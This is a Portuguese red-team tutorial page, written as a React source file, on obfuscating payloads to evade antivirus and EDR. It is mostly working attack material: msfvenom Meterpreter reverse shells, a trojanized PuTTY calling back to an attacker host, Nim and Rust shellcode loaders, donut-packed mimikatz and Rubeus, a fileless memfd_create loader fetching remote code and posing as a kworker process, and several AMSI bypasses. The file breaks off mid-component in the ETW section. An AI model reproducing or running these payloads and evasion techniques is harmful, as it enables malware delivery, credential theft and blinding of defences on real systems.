import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function PayloadObfuscation() {
  return (
    <PageContainer
      title="Ofuscação de Payloads — Bypass de AV / EDR"
      subtitle="msfvenom encoders, Shellter, Veil, packers (UPX/Themida), in-memory loading via memfd_create, AMSI bypass, donut, sgn, loaders em Nim/Rust, Process Hollowing, Direct Syscalls e ETW patching."
      difficulty="avancado"
      timeToRead="32 min"
      prompt="redteam/evasion"
    >
      <AlertBox type="danger" title="Uso restrito a red team com RoE assinado">
        Toda técnica abaixo só pode ser usada em ambiente próprio (lab) ou em engagement com
        Rules of Engagement explícitas. Distribuir malware fora desse escopo é crime
        (CP Art. 154-A, Lei 12.737/12). Esta página existe para ensinar <em>defesa</em> via
        compreensão de ofensa.
      </AlertBox>

      <h2>Por que ofuscar?</h2>
      <p>
        Um <code>msfvenom</code> "puro" sai do disco e morre antes de executar — Defender,
        CrowdStrike, SentinelOne todos reconhecem o stub do Meterpreter por assinatura. Ofuscação
        muda <strong>aparência</strong> sem mudar comportamento. AV/EDR moderno olha 5 camadas:
      </p>

      <OutputBlock label="camadas de detecção em 2026" type="muted">
{`1. STATIC SIG       — hash conhecido (SHA-256, ImpHash) → trivial bypass (recompilar)
2. STATIC HEUR      — strings, imports, entropy, .text suspeito → packer/encoder
3. EMULATION        — runa N instruções num sandbox curto → sleep/decoy + check VM
4. AMSI / SCRIPT    — scan de PowerShell/JScript/.NET em memória → AMSI bypass
5. EDR RUNTIME      — userland hooks em ntdll, ETW, Sysmon, kernel callbacks
                      → unhooking, direct syscalls, ETW patching
6. CLOUD TELEMETRY  — comportamento (parent/child, network, file IO)
                      → LOTL (living off the land), mimicar admin`}
      </OutputBlock>

      <h2>msfvenom — sintaxe e encoders</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "payload Meterpreter Windows x64 — sem ofuscação (será morto)",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o /tmp/raw.exe",
            out: `[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: /tmp/raw.exe`,
            outType: "muted",
          },
          {
            comment: "verificar detecção local com clamav",
            cmd: "clamscan /tmp/raw.exe",
            out: `/tmp/raw.exe: Win.Trojan.MSShellcode-1 FOUND

----------- SCAN SUMMARY -----------
Known viruses: 8742184
Scanned files: 1
Infected files: 1
Time: 14.521 sec`,
            outType: "error",
          },
          {
            comment: "aplicar shikata_ga_nai 5x — encoder polimórfico (XOR feedback)",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o /tmp/encoded.exe",
            out: `Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x64/xor_dynamic
x64/xor_dynamic succeeded with size 567 (iteration=0)
x64/xor_dynamic succeeded with size 624 (iteration=1)
x64/xor_dynamic succeeded with size 681 (iteration=2)
x64/xor_dynamic succeeded with size 738 (iteration=3)
x64/xor_dynamic succeeded with size 795 (iteration=4)
x64/xor_dynamic chosen with final size 795
Payload size: 795 bytes
Final size of exe file: 7168 bytes
Saved as: /tmp/encoded.exe`,
            outType: "info",
          },
          {
            comment: "evitar bad chars (null, CR, LF) para shellcode em strings",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -b '\\x00\\x0a\\x0d' -f c",
            out: `[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor chosen with final size 551
Payload size: 551 bytes
Final size of c file: 2354 bytes
unsigned char buf[] =
"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41"
"\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48"
[...]`,
            outType: "default",
          },
          {
            comment: "stage menor (staged) — payload em duas partes (stager baixa o resto)",
            cmd: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe-only -o /tmp/stager.exe",
            out: `Payload size: 712 bytes
Final size of exe-only file: 7168 bytes
Saved as: /tmp/stager.exe`,
            outType: "info",
          },
        ]}
      />

      <CommandTable
        title="Flags principais do msfvenom"
        variations={[
          { cmd: "-p PAYLOAD", desc: "Payload (windows/x64/meterpreter/reverse_tcp etc.).", output: "msfvenom --list payloads" },
          { cmd: "-f FORMAT", desc: "Formato de saída.", output: "exe, dll, raw, c, py, ps1, hta-psh, vba, war, elf, macho..." },
          { cmd: "-e ENCODER", desc: "Encoder (varia por arch).", output: "x86/shikata_ga_nai, x64/xor_dynamic, x64/zutto_dekiru" },
          { cmd: "-i N", desc: "Quantas iterações de encoding.", output: "Mais iterações = +entropia, +tamanho. 3-5 é o sweet spot." },
          { cmd: "-b BAD", desc: "Bytes a evitar.", output: "\\x00\\x0a\\x0d para shellcode em strings C." },
          { cmd: "-x TEMPLATE", desc: "Template EXE legítimo (PE).", output: "msfvenom -x putty.exe -k -p ... → embute no PuTTY." },
          { cmd: "-k", desc: "Mantém template rodando (junto com payload).", output: "Vítima vê PuTTY abrir normal + Meterpreter conecta." },
          { cmd: "-n N", desc: "NOP sled prefixo.", output: "Útil para alinhar shellcode em buffer overflow." },
          { cmd: "--smallest", desc: "Otimiza tamanho final.", output: "Útil quando o vetor de entrega tem limite de bytes." },
          { cmd: "-a / --platform", desc: "Arch e SO.", output: "x86, x64, armle, mips ; windows, linux, osx, android" },
        ]}
      />

      <h2>Listar encoders e formatos</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "msfvenom --list encoders | head -20",
            out: `Framework Encoders [--encoder <value>]
====================================

    Name                          Rank        Description
    ----                          ----        -----------
    cmd/brace                     low         Bash Brace Expansion Command Encoder
    cmd/echo                      good        Echo Command Encoder
    cmd/generic_sh                manual      Generic Shell Variable Substitution
    cmd/perl                      normal      Perl Command Encoder
    cmd/powershell_base64         excellent   Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual      printf(1) via PHP magic_quotes
    generic/eicar                 manual      The EICAR Encoder
    generic/none                  normal      The "none" Encoder
    mipsbe/byte_xori              normal      Byte XORi Encoder
    mipsle/byte_xori              normal      Byte XORi Encoder
    php/base64                    great       PHP Base64 Encoder
    ppc/longxor                   normal      PPC LongXOR Encoder
    ppc/longxor_tag               normal      PPC LongXOR Encoder
    ruby/base64                   great       Ruby Base64 Encoder
    sparc/longxor_tag             normal      SPARC DWORD XOR Encoder
    x64/xor                       normal      XOR Encoder
    x64/xor_context               normal      Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal      Dynamic key XOR Encoder
    x64/zutto_dekiru              manual      Zutto Dekiru`,
            outType: "info",
          },
          {
            cmd: "msfvenom --list formats | head -25",
            out: `Framework Executable Formats [--format <value>]
=================================================
    asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only,
    exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho,
    msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection,
    python-reflection, vba, vba-exe, vba-psh, vbs, war

Framework Transform Formats [--format <value>]
================================================
    base32, base64, bash, c, csharp, dw, dword, hex, java, js_be,
    js_le, num, perl, powershell, py, python, raw, rb, ruby, rust,
    sh, vbapplication, vbscript`,
            outType: "default",
          },
        ]}
      />

      <h2>Shellter — injeção em PE legítimo</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y shellter && shellter --version",
            out: `Shellter v7.2 — Dynamic Shellcode Injector
(c) Kyriakos Economou`,
            outType: "muted",
          },
          {
            comment: "baixa um EXE legítimo qualquer (32-bit é mais compatível)",
            cmd: "wget -q https://the.earth.li/~sgtatham/putty/0.78/w32/putty.exe -O ~/loot/putty.exe && file ~/loot/putty.exe",
            out: `~/loot/putty.exe: PE32 executable (GUI) Intel 80386, for MS Windows`,
            outType: "info",
          },
          {
            cmd: "shellter",
            out: `      Shellter v7.2 (Free)
      Released: 21/06/2024
      Author: Kyriakos Economou (@kyREcon)

Choose Operation Mode - Auto/Manual (A/M/H): A
PE Target: /home/wallyson/loot/putty.exe

***********************
* Backup Original PE  *
***********************
Backup: Shellter_Backups/putty.exe.bak

***********************
*  Tracing  Mode      *
***********************
Tracing Time Approx: 30-60 seconds.
[*] Starting First Stage Filtering...
[*] Hold on...

***********************
*  Fingerprinting     *
***********************
Filter Time Approx: 5-10 seconds.

Enable Stealth Mode? (Y/N/H): Y
Use a listed payload or custom? (L/C/H): L

   1: Meterpreter_Reverse_TCP   [stager]
   2: Meterpreter_Reverse_HTTP  [stager]
   3: Meterpreter_Reverse_HTTPS [stager]
   4: Meterpreter_Bind_TCP      [stager]
   5: Shell_Reverse_TCP         [stager]
   6: Shell_Bind_TCP            [stager]
   7: WinExec

Use payload: 3
SET LHOST: 192.168.1.50
SET LPORT: 443

[*] Injecting Code
[*] Encoding Payload: 3 / 3
[*] Verification Stage

[!] Shellter Verification: PASSED
[*] Injection: Verified.

Press [Enter] to continue...`,
            outType: "warning",
          },
          {
            cmd: "ls -la ~/loot/putty.exe Shellter_Backups/",
            out: `-rwxr-xr-x 1 wallyson wallyson 1604608 Apr  4 01:14 /home/wallyson/loot/putty.exe   ← já modificado
total 1568
-rw-r--r-- 1 wallyson wallyson 1604096 Apr  4 01:12 putty.exe.bak`,
            outType: "default",
          },
          {
            comment: "testar — putty abre normal + payload conecta de volta",
            cmd: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.1.50; set LPORT 443; run -j'",
            out: `[*] Started HTTPS reverse handler on https://192.168.1.50:443
[*] https://192.168.1.50:443 handling request from 192.168.1.107; (UUID: 4f...) Staging x86 payload (176732 bytes)
[*] Meterpreter session 1 opened (192.168.1.50:443 -> 192.168.1.107:51024) at 2026-04-04 01:18:42 -0300

meterpreter > sysinfo
Computer        : DESKTOP-ANA
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
Meterpreter     : x86/windows`,
            outType: "error",
          },
        ]}
      />

      <h2>Veil-Evasion — gerador multi-linguagem</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y veil && sudo /usr/share/veil/config/setup.sh --force --silent",
            out: `[*] Initializing Veil...
[*] Setting up Wine + Python in /var/lib/veil
[*] Done. Run 'veil' to start.`,
            outType: "muted",
          },
          {
            cmd: "veil",
            out: `===============================================================================
                                Veil | [Version]: 3.1.14
===============================================================================
       [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Main Menu
        2 tools loaded

Available Tools:
        1)   Evasion
        2)   Ordnance

Available Commands:
        exit             Completely exit Veil
        info             Information on a specific tool
        list             List available tools
        options          Show Veil configuration
        update           Update Veil
        use              Use a specific tool

Veil>:`,
            outType: "info",
          },
          {
            cmd: "Veil>: use 1",
            out: `===============================================================================
                                   Veil-Evasion
===============================================================================

[*] Available Payloads:
        1)      autoit/shellcode_inject/flat.py
        2)      auxiliary/coldwar_wrapper.py
        3)      auxiliary/macro_converter.py
        4)      auxiliary/pyinstaller_wrapper.py
        5)      c/meterpreter/rev_http.py
        6)      c/meterpreter/rev_tcp.py
        7)      cs/meterpreter/rev_http.py
        8)      cs/meterpreter/rev_tcp.py
        9)      go/meterpreter/rev_http.py
       10)      go/meterpreter/rev_tcp.py
       11)      go/meterpreter/rev_tcp_service.py
       12)      go/shellcode_inject/heap.py
       13)      nim/shellcode_inject/flat.nim       ← Nim! AV-friendly
       14)      powershell/meterpreter/rev_http.py
       15)      python/meterpreter/rev_http.py
       16)      python/shellcode_inject/aes_encrypt.py
       17)      ruby/meterpreter/rev_http.py
       [...]`,
            outType: "default",
          },
          {
            cmd: "[Veil/Evasion]: use 13",
            out: `===============================================================================
 Payload Information:
        Name:           Pure Nim Reverse Shellcode Loader
        Language:       nim
        Rating:         Excellent
        Description:    Reverse shellcode loader written in pure Nim,
                        AES encrypted, alloc + memcpy + casted func ptr.

[nim/shellcode_inject/flat]>>: set LHOST 192.168.1.50
[nim/shellcode_inject/flat]>>: set LPORT 443
[nim/shellcode_inject/flat]>>: generate

 [?] Generate Payload Name (default: payload): empresa_update

 [*] Language: nim
 [*] Payload Module: nim/shellcode_inject/flat
 [*] Executable written to: /var/lib/veil/output/compiled/empresa_update.exe
 [*] Source code written to: /var/lib/veil/output/source/empresa_update.nim
 [*] Metasploit RC file written to: /var/lib/veil/output/handlers/empresa_update.rc`,
            outType: "warning",
          },
        ]}
      />

      <h2>Packers — UPX, MPRESS, Themida</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "UPX — open source, MUITO conhecido (assinatura própria)",
            cmd: "upx --best --ultra-brute /tmp/encoded.exe -o /tmp/encoded_upx.exe",
            out: `                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.4       Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 25th 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
      7168 ->      4096   57.14%   win64/pe      encoded_upx.exe

Packed 1 file.`,
            outType: "info",
          },
          {
            comment: "AVs detectam UPX trivialmente — renomear seções ajuda pouco",
            cmd: "objcopy --rename-section UPX0=.text --rename-section UPX1=.rdata /tmp/encoded_upx.exe /tmp/upx_renamed.exe",
            out: `(silencioso. AV ainda detecta padrão de descompressão)`,
            outType: "muted",
          },
          {
            comment: "MPRESS — alternativa proprietária (Windows-only para empacotar)",
            cmd: "wine mpress.exe -s /tmp/encoded.exe",
            out: `MPRESS Version: 2.19   (c) 2007-2017, MATCODE Software
Module size:    7168 bytes
Module size:    4608 bytes (Ratio: 64.28%)
Done.`,
            outType: "default",
          },
          {
            comment: "Themida — comercial, ~600 USD, gold standard de obfuscation",
            cmd: "wine 'C:/Program Files/Themida/Themida.exe' /protect:project.tmd",
            out: `Themida 3.1.7.0 — Advanced Software Protection
[*] Loading project: project.tmd
[*] Target: /tmp/encoded.exe
[*] Applying protection layers...
    [+] Anti-Debugger          : ENABLED (Standard + Advanced)
    [+] Anti-DLL Injection     : ENABLED
    [+] Anti-Memory Patcher    : ENABLED
    [+] VM Detection           : ENABLED (VMware, VBox, Hyper-V, Sandboxie)
    [+] VM Macros              : 142 instructions virtualized
    [+] CISC Mutation          : ENABLED (Level: ULTRA)
    [+] String Encryption      : ENABLED
[*] Output: /tmp/encoded_themida.exe (4.2 MB)
[*] Done in 18.421s`,
            outType: "warning",
          },
        ]}
      />

      <CommandTable
        title="Packers / protectors comparados"
        variations={[
          { cmd: "UPX", desc: "Open source, compressão simples.", output: "Detectado por TODOS AVs. Use só como camada extra." },
          { cmd: "MPRESS", desc: "Free, melhor que UPX.", output: "Detecção média (~30 vendors)." },
          { cmd: "PECompact", desc: "Comercial, ~$200.", output: "Boa relação custo/evasão. ~10 vendors detectam." },
          { cmd: "Enigma Protector", desc: "Comercial, ~$300.", output: "Anti-debug + VM. ~5 vendors." },
          { cmd: "VMProtect", desc: "Comercial, ~$500. Virtualiza instruções.", output: "Padrão de jogos pirateados. Hard to RE." },
          { cmd: "Themida", desc: "Comercial, ~$600. Top de linha.", output: "<3 vendors detectam stub. Anti-tudo." },
          { cmd: "Confuser/ConfuserEx", desc: "Free para .NET.", output: "Para C# loaders. Combine com obfuscar." },
        ]}
      />

      <h2>Donut — shellcode de qualquer .NET / PE / DLL / VBS / JS</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "git clone https://github.com/TheWover/donut && cd donut && make",
            out: `Cloning into 'donut'...
[...]
gcc -fPIC -Wall -Iinclude -DDONUT_INSTANCE  -c -o loader/inmem_pe.o loader/inmem_pe.c
gcc -fPIC -Wall -Iinclude -DDONUT_INSTANCE  -c -o loader/inmem_dotnet.o loader/inmem_dotnet.c
[...]
gcc -o donut donut.o include/encrypt.o
ar rcs lib/donut.a [...]
Done.`,
            outType: "muted",
          },
          {
            comment: "converter mimikatz.exe em shellcode posicional independente",
            cmd: "./donut -i ~/tools/mimikatz.exe -o /tmp/mimi.bin -a 2 -f 1",
            out: `
  [ Donut shellcode generator v1.0
  [ Copyright (c) 2019-2024 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : "/home/wallyson/tools/mimikatz.exe"
  [ Entropy       : Random names + Encryption
  [ Compressed    : Xpress
  [ File type     : EXE
  [ Target CPU    : amd64
  [ AMSI/WDLP     : continue
  [ Shellcode     : "/tmp/mimi.bin"
  [ Size          : 1142528 bytes`,
            outType: "info",
          },
          {
            comment: "mesma coisa para um assembly .NET (Rubeus, SharpHound, Seatbelt...)",
            cmd: "./donut -i ~/tools/Rubeus.exe -p 'kerberoast /outfile:C:\\\\Windows\\\\Temp\\\\k.txt' -o /tmp/rubeus.bin",
            out: `  [ Module type   : .NET EXE
  [ Parameters    : "kerberoast /outfile:C:\\Windows\\Temp\\k.txt"
  [ Class         : Rubeus.Program
  [ Method        : Main
  [ Shellcode     : "/tmp/rubeus.bin"
  [ Size          : 248320 bytes`,
            outType: "warning",
          },
          {
            cmd: "ls -la /tmp/*.bin && file /tmp/mimi.bin",
            out: `-rw-r--r-- 1 wallyson wallyson 1142528 Apr  4 01:32 /tmp/mimi.bin
-rw-r--r-- 1 wallyson wallyson  248320 Apr  4 01:33 /tmp/rubeus.bin
/tmp/mimi.bin: data`,
            outType: "default",
          },
        ]}
      />

      <h2>SGN — Shikata Ga Nai em Go (encoder polimórfico moderno)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "go install github.com/EgeBalci/sgn/v2/cmd/sgn@latest",
            out: `go: downloading github.com/EgeBalci/sgn/v2 v2.0.4
go: downloading github.com/EgeBalci/keystone-go v0.0.0-20211111081516
[...]
(binário em ~/go/bin/sgn)`,
            outType: "muted",
          },
          {
            comment: "encode da bin do donut com 50 iterações",
            cmd: "sgn -a 64 -i /tmp/mimi.bin -o /tmp/mimi_sgn.bin -c 50 -E",
            out: `
   ███████╗  ██████╗ ███╗   ██╗
   ██╔════╝ ██╔════╝ ████╗  ██║
   ███████╗ ██║  ███╗██╔██╗ ██║
   ╚════██║ ██║   ██║██║╚██╗██║
   ███████║ ╚██████╔╝██║ ╚████║
   ╚══════╝  ╚═════╝ ╚═╝  ╚═══╝
   v2.0.4 — Shikata Ga Nai in Go

[*] Architecture:        amd64
[*] Iterations:          50
[*] Encoding:            true
[*] Input size:          1142528 bytes
[*] Encoding...
[+] Encoded payload size: 1145210 bytes
[+] Output: /tmp/mimi_sgn.bin`,
            outType: "info",
          },
          {
            comment: "comparar entropia",
            cmd: "binwalk -E /tmp/mimi.bin /tmp/mimi_sgn.bin | tail -20",
            out: `--------------------------------------------------------
DECIMAL       HEXADECIMAL     ENTROPY
--------------------------------------------------------
/tmp/mimi.bin
0             0x0             Falling entropy edge (0.741)
1024          0x400           Rising entropy edge (0.984)

/tmp/mimi_sgn.bin
0             0x0             Rising entropy edge (0.998)   ← uniforme = encrypted
1024          0x400           N/A`,
            outType: "warning",
          },
        ]}
      />

      <h2>Loaders em Nim (alternativa moderna a C/C++)</h2>
      <p>
        Nim compila para binários nativos pequenos, sem dependências, com sintaxe de Python.
        EDRs ainda têm baixa cobertura para padrões idiomáticos de Nim → boa evasão out-of-the-box.
      </p>

      <CodeBlock
        title="loader.nim — VirtualAlloc + RtlMoveMemory + CreateThread"
        language="nim"
        code={`# loader.nim — compile com:
#   nim c -d:release --opt:size --app:gui -o:loader.exe loader.nim

import winim/lean
import std/[base64, strutils]

# shellcode XOR-encoded (gerado por donut + sgn, depois XOR com chave 0x42)
const SC_B64 = "ENCODED_BASE64_DO_SHELLCODE_AQUI..."
const KEY: byte = 0x42

proc xorDecrypt(data: var seq[byte], key: byte) =
  for i in 0 ..< data.len:
    data[i] = data[i] xor key

proc execShellcode() =
  var sc = cast[seq[byte]](decode(SC_B64))
  xorDecrypt(sc, KEY)

  # alocar memória RW (não RWX direto — evita heuristics)
  let mem = VirtualAlloc(nil, sc.len.SIZE_T, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return

  copyMem(mem, addr sc[0], sc.len)

  # mudar para RX (ainda menos suspeito que RWX)
  var oldProtect: DWORD
  discard VirtualProtect(mem, sc.len.SIZE_T, PAGE_EXECUTE_READ, addr oldProtect)

  # executar via thread
  let hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](mem),
                             nil, 0, nil)
  discard WaitForSingleObject(hThread, INFINITE)

when isMainModule:
  execShellcode()`}
      />

      <Terminal
        path="~/proj"
        lines={[
          {
            cmd: "nimble install winim",
            out: `Downloading https://github.com/khchen/winim using git
  Verifying dependencies for winim@4.0.10
Installing winim@4.0.10
   Success: winim installed successfully.`,
            outType: "muted",
          },
          {
            comment: "compilação cruzada para Windows (mingw)",
            cmd: "nim c -d:release -d:strip --opt:size --app:gui --cc:gcc --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc --os:windows -o:loader.exe loader.nim",
            out: `Hint: used config file '/etc/nim/nim.cfg' [Conf]
Hint: 33421 lines; 1.842s; 38.214MiB peakmem; proj: loader [SuccessX]
Hint: gcc -o loader.exe ... [Link]
Hint: operation successful (47482 lines compiled; 2.184 sec total) [SuccessX]`,
            outType: "info",
          },
          {
            cmd: "ls -la loader.exe && file loader.exe",
            out: `-rwxr-xr-x 1 wallyson wallyson 218112 Apr  4 01:42 loader.exe
loader.exe: PE32+ executable (GUI) x86-64, for MS Windows`,
            outType: "default",
          },
        ]}
      />

      <h2>Loaders em Rust (mesma ideia, melhor supply-chain)</h2>
      <CodeBlock
        title="src/main.rs — Rust loader simples"
        language="rust"
        code={`// Cargo.toml:
//   [dependencies]
//   windows = { version = "0.56", features = ["Win32_System_Memory","Win32_System_Threading"] }
//   [profile.release]
//   opt-level = "z"
//   lto = true
//   strip = true
//   panic = "abort"

use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;

const SC: &[u8] = include_bytes!("..\\\\payload.bin"); // shellcode (donut+sgn)
const KEY: u8 = 0x42;

fn main() {
    let mut sc: Vec<u8> = SC.iter().map(|b| b ^ KEY).collect();
    unsafe {
        let mem = VirtualAlloc(None, sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        std::ptr::copy_nonoverlapping(sc.as_ptr(), mem as *mut u8, sc.len());
        let mut old = PAGE_PROTECTION_FLAGS(0);
        let _ = VirtualProtect(mem, sc.len(), PAGE_EXECUTE_READ, &mut old);
        let h = CreateThread(None, 0, Some(std::mem::transmute(mem)),
                             None, THREAD_CREATION_FLAGS(0), None).unwrap();
        WaitForSingleObject(h, INFINITE);
    }
}`}
      />

      <Terminal
        path="~/rust-loader"
        lines={[
          {
            cmd: "rustup target add x86_64-pc-windows-gnu",
            out: `info: downloading component 'rust-std' for 'x86_64-pc-windows-gnu'
info: installing component 'rust-std' for 'x86_64-pc-windows-gnu'
  19.4 MiB /  19.4 MiB (100 %)`,
            outType: "muted",
          },
          {
            cmd: "cargo build --release --target x86_64-pc-windows-gnu",
            out: `   Compiling windows-sys v0.52.0
   Compiling windows v0.56.0
   Compiling rust-loader v0.1.0 (/home/wallyson/rust-loader)
    Finished release [optimized] target(s) in 18.42s`,
            outType: "info",
          },
          {
            cmd: "ls -la target/x86_64-pc-windows-gnu/release/*.exe",
            out: `-rwxr-xr-x 2 wallyson wallyson 184832 Apr  4 01:51 target/x86_64-pc-windows-gnu/release/rust-loader.exe`,
            outType: "default",
          },
        ]}
      />

      <h2>In-memory loading no Linux — memfd_create</h2>
      <p>
        <code>memfd_create(2)</code> cria um arquivo só em RAM (visível em
        <code>/proc/PID/fd/N</code>). <code>execve("/proc/self/fd/N",...)</code> roda
        sem nunca tocar o disco — antiforense + bypass de file integrity monitoring.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "baixar binário malicioso e executar SEM gravar em disco",
            cmd: `python3 -c '
import os, urllib.request, ctypes
buf = urllib.request.urlopen("http://192.168.1.50/agent").read()
fd = ctypes.CDLL(None).syscall(319, b"x", 0)   # memfd_create
os.write(fd, buf)
os.execve(f"/proc/self/fd/{fd}", ["[kworker/u8:1]"], os.environ)
'`,
            out: `(silencioso. binário rodou; ls /tmp e find / -newer NÃO mostram nada)`,
            outType: "warning",
          },
          {
            comment: "verificar do outro shell que o processo está vivo, sem path em disco",
            cmd: "ps -ef | grep kworker/u8:1",
            out: `wallyson  4421  4242  0 02:01 pts/1  00:00:00 [kworker/u8:1]
wallyson  4452  4421  0 02:01 pts/1  00:00:00 grep kworker/u8:1`,
            outType: "info",
          },
          {
            cmd: "readlink /proc/4421/exe",
            out: `/memfd:x (deleted)               ← bandeira vermelha forense (mas SEM path real)`,
            outType: "error",
          },
          {
            comment: "alternativa one-liner em bash com curl + bash builtin /dev/tcp",
            cmd: `curl -s http://192.168.1.50/agent | python3 -c "import os,sys; fd=os.memfd_create('x'); os.write(fd, sys.stdin.buffer.read()); os.execv(f'/proc/self/fd/{fd}', ['x'])"`,
            out: `(silencioso. mesmo efeito.)`,
            outType: "muted",
          },
          {
            comment: "Detecção: auditd watch em syscall memfd_create",
            cmd: "sudo auditctl -a always,exit -F arch=b64 -S memfd_create -k memfd_susp",
            out: `(blue team: agora todo memfd_create é logado)
type=SYSCALL ... syscall=319 success=yes ... auid=1000 comm="python3" key="memfd_susp"`,
            outType: "default",
          },
        ]}
      />

      <h2>AMSI bypass (Anti-Malware Scan Interface)</h2>
      <p>
        AMSI permite ao Defender escanear PowerShell, JScript, VBScript, .NET, Office macros
        em <strong>memória</strong>, antes de executar. Sem bypass, qualquer comando suspeito
        em PS é morto. As 3 técnicas clássicas:
      </p>

      <CodeBlock
        title="amsi-bypass.ps1 — força amsiInitFailed = true"
        language="powershell"
        code={`# Técnica 1: Matt Graeber clássica (já patcheada em PS5+ atualizado, ainda funciona em 90% dos hosts)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Técnica 1b — versão obfuscada (concatenação de strings → escapa regex de assinatura)
$a = [Ref].Assembly.GetType("System.$([char]0x4d)anagement.Automation.A$([char]0x6d)siUtils")
$b = $a.GetField("a$([char]0x6d)siInitFailed", [Reflection.BindingFlags]"NonPublic,Static")
$b.SetValue($null, $true)

# Técnica 2 — patch in-memory de AmsiScanBuffer (retorna AMSI_RESULT_CLEAN)
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint prot, out uint old);
}
"@
Add-Type $Win32

$amsi = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($amsi, "AmsiScanBuffer")
$patch = [Byte[]] (0xB8,0x57,0x00,0x07,0x80,0xC3)   # mov eax, 0x80070057 ; ret  (E_INVALIDARG)
$old = 0
[Win32]::VirtualProtect($addr, [UIntPtr]6, 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)

# Técnica 3 — desabilitar provider via reflexão (mais furtiva)
$ctx = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static')
$ctx.SetValue($null, [IntPtr]::Zero)`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "encodar o bypass para 1 oneliner -EncodedCommand",
            cmd: `echo -n '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)' | iconv -f ascii -t utf-16le | base64 -w0`,
            out: `WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACIAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACIAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACIALAAiAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAIgApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkA`,
            outType: "info",
          },
          {
            comment: "no alvo Windows: powershell -ec <base64>; depois IEX livre",
            cmd: "powershell -ec WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4A...",
            out: `(silencioso. AMSI agora retorna CLEAN para tudo nessa sessão.)`,
            outType: "warning",
          },
        ]}
      />

      <h2>ETW patching — silenciar Event Tracing for Windows</h2>
      <p>
        ETW alimenta Sysmon, Defender for Endpoint, EDRs em geral. Patch in-memory de
        <code>EtwEventWrite</code> (em <code>ntdll.dll</code>) → providers param de emitir.
        Combine com AMSI bypass para PowerShell ofensivo silencioso.
      </p>

      <CodeBlock
        title="etw-patch.ps1"
        language="powershell"
